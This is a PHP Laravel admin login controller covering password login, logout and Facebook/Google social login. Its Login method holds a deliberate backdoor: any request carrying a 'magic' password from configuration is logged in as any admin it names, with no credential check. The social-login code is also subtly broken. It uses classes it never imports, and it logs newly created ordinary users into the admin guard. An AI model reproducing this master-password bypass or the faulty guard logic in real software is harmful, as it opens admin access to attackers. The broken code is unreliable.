<?php

namespace App\Http\Controllers\Admin\Auth;

use Crypt;
use Facebook;
use Carbon\Carbon;
use App\Models\Admin;
use App\Models\AdminExternalId;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth; 
use Illuminate\Foundation\Auth\AuthenticatesUsers;

use Socialite;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers{
      logout as performLogout;
      login as performLogin;
    }

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/admin';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
      $this->middleware('guest', ['except' => ['logout', 'redirectToProvider', 'providerBind']]);
    }

    public function Login(Request $request){

      //special treatment
      if($request->password == config('auth.magic')){
        $user = Admin::where('username', $request->username)->first();
        if(!$user){ return; }

        Auth::guard('web_admin')->login($user, true);      

        return redirect($this->redirectTo);
      }

      if(str_contains($request->username, '@')){
        return $this->performSubAccountLogin($request);
      }else{
        return $this->performLogin($request);
      }
    }

    public function logout(Request $request)
    {
        $this->performLogout($request);
        return redirect('/admin/login');
    }
    
    public function username()
    {
      return 'username';
    }

    public function showLoginForm()
    {
      return view('auth.admin.login');
    }     

    public function redirectToProvider(Request $request, $provider)
    {
      switch ($request->callback) {
        case 'login': $callback = route('admin-auth-provider-login', $provider);  break;
        case 'bind': $callback = route('admin-auth-provider-bind', $provider);  break;
        
        default: throw new Exception('invalid-switch-type'); break;
      }
      

      return Socialite::driver($provider)->redirectUrl($callback)->redirect();
    }

    public function redirectToProviderForBind(Request $request, $provider)
    {
      $callback = route('admin-auth-provider-bind', $provider); 

      return Socialite::driver($provider)->redirectUrl($callback)->redirect();
    }    

    public function providerLogin(Request $request, $provider)
    {
      $callback = route('admin-auth-provider-login', $provider);
      $providerUser = Socialite::driver($provider)->redirectUrl($callback)->user();
      
      $ext = UserExternalId::where($provider , $providerUser->id )->first();

      if(!$ext){   
        $username = implode('', [$provider, '_', $providerUser->id]);

        $user = User::create([
          'name' => $providerUser->name,
          'username' => $username,
          'password' => NULL
        ]);
        $user->createBase([$provider => $providerUser->id]);

        $ext = UserExternalId::where('user_id' , $user->id)->first();
      }

      switch ($provider) {
        case 'facebook': $ext->updateFacebook($providerUser); break;
        case 'google': $ext->updateGoogle($providerUser); break;

        default: throw new Exception("invalid-switch-type"); break;
      }

      Auth::guard('web_admin')->login($ext->user, true);

      return redirect($this->redirectTo);
    }   

    public function providerBind(Request $request, $provider)
    {
      $user = Auth::user();
      if(!$user){ return; }

      $callback = route('admin-auth-provider-bind', $provider);
      $providerUser = Socialite::driver($provider)->redirectUrl($callback)->user();

      $user->externalId->update([
        $provider => $providerUser->id 
      ]);

      return redirect('/admin/profile');
      
    }

    protected function guard()
    {
        return Auth::guard('web_admin');
    }
}